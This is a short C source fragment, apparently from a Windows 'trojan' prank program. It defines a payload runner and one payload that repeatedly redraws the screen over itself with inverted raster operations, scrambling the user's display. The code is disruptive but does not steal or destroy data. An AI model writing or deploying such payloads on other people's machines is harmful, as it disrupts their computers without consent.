#include "payloads.h"

VOID
ExecutePayload(
	_In_ TROJAN_PAYLOAD Payload,
	_In_ DWORD dwTime
) {
	HDC hdcScreen = GetDC( NULL );
	DWORD dwStartTime = dwTimeElapsed;

	for ( INT i = 0; dwStartTime < ( dwTimeElapsed + dwTime ); i++ )
		Payload( i, hdcScreen );

	ReleaseDC( NULL, hdcScreen );
}

VOID
Payload1(
	_In_ INT t,
	_In_ HDC hdcScreen
) {
	              
	POINT ptScreen = GetVirtualScreenPos( );
	SIZE szScreen = GetVirtualScreenSize( );
	t *= 10;

	BitBlt( hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen,
		ptScreen.x + t % ( szScreen.cx * 2 ) - szScreen.cx, ptScreen.y + t * 2 % ( szScreen.cy * 2 ) - szScreen.cy, NOTSRCERASE );

	Sleep( 1 );
}
